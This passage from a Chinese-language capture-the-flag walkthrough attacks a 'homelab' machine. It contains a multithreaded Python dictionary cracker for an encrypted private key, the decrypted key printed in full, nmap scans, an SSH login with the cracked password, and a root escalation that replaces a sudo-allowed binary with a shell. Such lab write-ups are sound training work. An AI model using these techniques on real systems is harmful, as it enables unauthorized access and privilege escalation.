DICT_FILE = "/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt"  # 密码字典
THREADS = 8                    # 并发线程数（根据CPU核心调整）
OUT_FILE = "de.txt"            # 解密输出文件

found = False                  # 全局终止标志
found_lock = threading.Lock()  # 线程锁

def try_password(password):
    global found
    
    # 检查终止标志
    if found:
        return
    
    # 执行 OpenSSL 命令
    try:
        result = subprocess.run(
            ["openssl", "pkcs8", "-in", KEY_FILE, "-out", OUT_FILE, "-passin", f"pass:{password}"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=5  # 防止卡死
        )
        
        # 检查返回码
        if result.returncode == 0:
            with found_lock:
                if not found:
                    found = True
                    print(f"\n[+] 密码找到: {password}")
                    Path(OUT_FILE).unlink(missing_ok=True)  # 清理临时文件
                    sys.exit(0)
    except:
        pass

def main():
    # 检查文件是否存在
    if not Path(KEY_FILE).exists():
        print(f"[-] 错误：私钥文件 {KEY_FILE} 不存在")
        sys.exit(1)
    
    if not Path(DICT_FILE).exists():
        print(f"[-] 错误：字典文件 {DICT_FILE} 不存在")
        sys.exit(1)
    
    print(f"[*] 开始爆破 {KEY_FILE}，使用字典: {DICT_FILE}")
    print(f"[* 线程数: {THREADS}")

    # 使用生成器逐行读取字典
    def password_generator():
        with open(DICT_FILE, 'r', errors='ignore') as f:
            for line in f:
                pwd = line.strip()
                if pwd:
                    yield pwd
    
    # 启动线程池
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        try:
            for count, pwd in enumerate(password_generator(), 1):
                if found:
                    break
                executor.submit(try_password, pwd)
                # 显示进度
                if count % 1000 == 0:
                    print(f"\r[*] 已尝试 {count} 个密码", end='', flush=True)
        except KeyboardInterrupt:
            print("\n[!] 用户中断操作")
            sys.exit(1)
    
    print("\n[-] 字典穷举完毕，未找到正确密码")

if __name__ == "__main__":
    main()
```

```
└─# python3 dxc.py
[*] 开始爆破 client.key，使用字典: /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
[* 线程数: 8
[*] 已尝试 999000 个密码
[+] 密码找到: hiro

[-] 字典穷举完毕，未找到正确密码
```

爆破得密码：`hiro`

可以用`openssl`把加密私钥变成没密码的，然后 把`client.ovpn` 文件复制一份为`2021.ovpn`，再把里面的`<key>`内容换成解密后的，登陆就不用输密码了

```shell
└─# openssl rsa -in client.key -out client_un.key
Enter pass phrase for client.key:#hiro
writing RSA key
└─# cat client_un.key
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCkGK9Zvm82MWR/
a2DauuyJPhB7kEyZG1X+0sF3jUcVqVn435xI7TIKLFb6AH2BtJSlCTH62RaYqbxk
PL+qncOJnTz/OiVUv8TnoixRFqa6hANy2pifuuVcz3JifYBRIKC6EU/ZzlxnLEBg
GMSN024EmjSEEvGvo6h0F+d6WORIPkQrXUhWYGRkBuQAhh72edqETsURHSrTIL9c
2DAyW2uvZAbQXZtOa4mHRNBsVcxqyO+DZb+sOryeCp+d00uvQgXbt7O3TMs6b4lj
U3cQwMYQv/sECCEPMDnOWHI6dj1oqirbXx/x34316LsiygpcOeDWV1eoxQw5Gk9C
1TgY8HAJAgMBAAECggEABnAR/A46sHh4Wf/hUz97XWiGDsTy3lxaT7aewLUWFXlZ
Bmimad2FZa0G5gS8J8ko/j8Juw7GgkuBcLjJ57SMCfN1Y8l5ErW50MEV5kICXUWl
2X0OOREE49LfKNJF5RjnuVkJxhCgoysTJPn/xxUlBzDyD77rBLIh3xkbe5subI+V
s/hEW7wDjcd5G2ekzh3EZM03OeQbgin386gxFa4piuLFCG3As74eE/By+Qr+MfBK
sUWwAkTm292Mk3THeLNaeWISI8v4sQhsgC6McbwX5awXXs3Do01w1enw/5pWdv3o
Wvbp72/fhc2m6JLu7pqx8SzoOhqfHxhzaI88r0gngQKBgQDYKmURthJSwvgCHA/d
VkRlgR3qcb1eMizoag/e+7HrbQssI8HQWeDyOXE2OfxMv1X+jO6vmnLy4WwB/dxT
t3ejmP7Gr4MZgI2CCmxNaZJsJC16iR0DcLoFAKsaLHDtu4D88As+zH8h3lVqME5r
6m1Vbm82DDeLjh2q3psK6qM7gQKBgQDCVe2p9ls1O4vs5PJ+1XUqrbnuNthZF1cf
InYANA+sFsFbsZiICLWSe1at0x3r2z4blWlOk7/ic+HkR6AnM8KM5tRneVuyy8f2
ryLEHa/zK0nTcU8paTw0/f1OJLaopPJh/kS3xzetpuwr34sjbOUlQBHo1QjxkW2g
MjrfwMGYiQKBgQDL1u6HzRFqScBk/OFY7siAj0kOk0LnWJlQcPOWafJU9vbaIL3b
I2YkBFbls7hfBu6oo21Q2mwa7MdU+XaS2ydOdi+KXGdb3QWT4xBNz4frwhHAwxtA
60P/A6pVfCLhizcPTazNAzm/TlFtWTAaQ23macUlSk/2oYUIY/IAUVKsAQKBgFZf
aqpH3HHkbWR0vXKx3MmDPUgrCC1QumAUKO4eNXj/BCGE5Y5QkKLyPqwzUPErGIeZ
+Jv7/yTe7F9RllTWJHoLfgwfXCozeESjwof3yeQCMWXQzqZRJ3lGCfdZSfXamgAD
yvcDjDOaJQ265VRxaccMmukpBjiXsmmo6ZHZUjJBAoGBAIjTXkoBeg+TlMwdls8q
1eCE/DZfwItYfWxeqdVJ2HK6v59d+vLFAopFzRnohtEyUUY/4IUh39EL29tLk0bx
5AxrD6ejM3nmGSNjisUbBPcu742wOl7qUYjIQDV4NE1JBbBNVaekRkrhATHEP8xZ
wKeMlrWu46yJMi06bbPWijoJ
-----END PRIVATE KEY-----
```

不要忘了前面的提示信息

```shell
└─# curl http://192.168.31.65/service/ -H "X-Forwarded-For:192.168.31.65"
# Last modified by shinosawa
# Regenerate a STRONG password for the KEY
# Do NOT use a SAME password as other services et. SSH
```

##### 获得`ssh`密码

用户名`shinosawa`，`ssh`密码：`hiro`，现在还不能直接`ssh`登陆（可尝试虚拟机本地登录），因为`ssh`服务要通过`openvpn`进

```shell
└─# openvpn 2021.vpn
2025-05-14 21:37:02 Note: Kernel support for ovpn-dco missing, disabling data channel offload.
2025-05-14 21:37:02 OpenVPN 2.6.13 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] [DCO]
2025-05-14 21:37:02 library versions: OpenSSL 3.4.0 22 Oct 2024, LZO 2.10
2025-05-14 21:37:02 DCO version: N/A
2025-05-14 21:37:02 WARNING: No server certificate verification method has been enabled.  See http://openvpn.net/howto.html#mitm for more info.
2025-05-14 21:37:02 TCP/UDP: Preserving recently used remote address: [AF_INET]192.168.31.65:1194
2025-05-14 21:37:02 Socket Buffers: R=[212992->212992] S=[212992->212992]
2025-05-14 21:37:02 UDPv4 link local: (not bound)
2025-05-14 21:37:02 UDPv4 link remote: [AF_INET]192.168.31.65:1194
2025-05-14 21:37:02 TLS: Initial packet from [AF_INET]192.168.31.65:1194, sid=8ad9a8fe 421c5c41
2025-05-14 21:37:02 VERIFY OK: depth=1, CN=My-Home CA
2025-05-14 21:37:02 VERIFY OK: depth=0, CN=server
2025-05-14 21:37:02 Control Channel: TLSv1.3, cipher TLSv1.3 TLS_AES_256_GCM_SHA384, peer certificate: 2048 bits RSA, signature: RSA-SHA256, peer temporary key: 253 bits X25519
2025-05-14 21:37:02 [server] Peer Connection Initiated with [AF_INET]192.168.31.65:1194
2025-05-14 21:37:02 TLS: move_session: dest=TM_ACTIVE src=TM_INITIAL reinit_src=1
2025-05-14 21:37:02 TLS: tls_multi_process: initial untrusted session promoted to trusted
2025-05-14 21:37:02 PUSH: Received control message: 'PUSH_REPLY,route 10.176.13.0 255.255.255.0,dhcp-option DNS 8.8.8.8,route-gateway 10.8.0.1,topology subnet,ping 10,ping-restart 120,ifconfig 10.8.0.2 255.255.255.0,peer-id 1,cipher AES-256-GCM,protocol-flags cc-exit tls-ekm dyn-tls-crypt,tun-mtu 1500'
2025-05-14 21:37:02 OPTIONS IMPORT: --ifconfig/up options modified
2025-05-14 21:37:02 OPTIONS IMPORT: route options modified
2025-05-14 21:37:02 OPTIONS IMPORT: route-related options modified
2025-05-14 21:37:02 OPTIONS IMPORT: --ip-win32 and/or --dhcp-option options modified
2025-05-14 21:37:02 OPTIONS IMPORT: tun-mtu set to 1500
2025-05-14 21:37:02 net_route_v4_best_gw query: dst 0.0.0.0
2025-05-14 21:37:02 net_route_v4_best_gw result: via 192.168.31.1 dev eth0
2025-05-14 21:37:02 ROUTE_GATEWAY 192.168.31.1/255.255.255.0 IFACE=eth0 HWADDR=5e:bb:f6:9e:ee:fa
2025-05-14 21:37:02 TUN/TAP device tun0 opened
2025-05-14 21:37:02 net_iface_mtu_set: mtu 1500 for tun0
2025-05-14 21:37:02 net_iface_up: set tun0 up
2025-05-14 21:37:02 net_addr_v4_add: 10.8.0.2/24 dev tun0
2025-05-14 21:37:02 net_route_v4_add: 10.176.13.0/24 via 10.8.0.1 dev [NULL] table 0 metric -1
2025-05-14 21:37:02 Initialization Sequence Completed
2025-05-14 21:37:02 Data Channel: cipher 'AES-256-GCM', peer-id: 1
2025-05-14 21:37:02 Timers: ping 10, ping-restart 120
2025-05-14 21:37:02 Protocol options: protocol-flags cc-exit tls-ekm dyn-tls-crypt
```

建立`vpn`链接后，网卡上多了个隧道`tun0`网卡

```shell
└─# ip a
5: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none
    inet 10.8.0.2/24 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 fe80::c059:a5bc:2a14:2d2e/64 scope link stable-privacy
       valid_lft forever preferred_lft forever
└─# route -n
10.176.13.0     10.8.0.1        255.255.255.0   UG    0      0        0 tun0

#openvpn 2021.vpn中配置
Received control message: 'PUSH_REPLY,route 10.176.13.0 255.255.255.0,dhcp-option DNS 8.8.8.8,route-gateway 10.8.0.1,topology subnet,ping 10,ping-restart 120,ifconfig 10.8.0.2 255.255.255.0,peer-id 1,cipher AES-256-GCM,protocol-flags cc-exit tls-ekm dyn-tls-crypt,tun-mtu 1500'
```

通过`openvpn`配置信息或者`kali路由表`可以查到靶机`vpn`网段为`10.176.13.0/24`

```shell
└─# nmap 10.176.13.0/24 -sn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-14 21:43 CST
Nmap scan report for 10.176.13.37 (10.176.13.37)
Host is up (0.0024s latency).
Nmap done: 256 IP addresses (1 host up) scanned in 14.57 seconds
└─# nmap 10.176.13.37
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-14 21:45 CST
Nmap scan report for 10.176.13.37 (10.176.13.37)
Host is up (0.0077s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.74 seconds
└─# ssh shinosawa@10.176.13.37
shinosawa@10.176.13.37's password:#hiro
homelab:~$ id
uid=1000(shinosawa) gid=1000(shinosawa) groups=100(users),1000(shinosawa)

```

用户名`shinosawa`，`ssh`密码：`hiro`

##### 拿到`user.flag`

```shell
homelab:~$ id
uid=1000(shinosawa) gid=1000(shinosawa) groups=100(users),1000(shinosawa)
homelab:~$ cd
homelab:~$ ls
deepseek   user.flag
homelab:~$ cat user.flag

```



### 获得root

```shell
homelab:~$ sudo -l
Matching Defaults entries for shinosawa on homelab:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for shinosawa:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User shinosawa may run the following commands on homelab:
    (ALL) NOPASSWD: /home/shinosawa/deepseek
homelab:~$ ls -l deepseek
-r-xr-xr-x    1 shinosawa shinosawa     18888 Apr 17 13:38 deepseek
```

`shinosawa`家目录下有个`deepseek`，属组还是自己，直接劫持文件提权（在自己家目录即使`root`属组的也可以直接劫持），注意看`/etc/passwd`文件，靶机默认的终端是`ash`

```shell
homelab:~$ mv deepseek a
homelab:~$ sudo -l
Matching Defaults entries for shinosawa on homelab:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for shinosawa:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User shinosawa may run the following commands on homelab:
    (ALL) NOPASSWD: /home/shinosawa/deepseek
homelab:~$ cat /etc/passwd
..........
shinosawa:x:1000:1000::/home/shinosawa:/bin/ash
homelab:~$
homelab:~$ echo ash > deepseek
homelab:~$ chmod +x deepseek
homelab:~$ sudo /home/shinosawa/deepseek
/home/shinosawa # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/home/shinosawa # cd
~ # ls -l
total 28
-r-xr-xr-x    1 shinosawa shinosawa     18888 Apr 17 13:38 a
-rwxr-xr-x    1 shinosawa shinosawa         4 May 15 05:39 deepseek
-r--------    1 shinosawa shinosawa        39 Apr 17 12:29 user.flag
homelab:~$
```

##### 拿到`root.flag`

```shell
/home/shinosawa # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/home/shinosawa # cd
~ # ls
root.flag
~ # cat root.flag
```

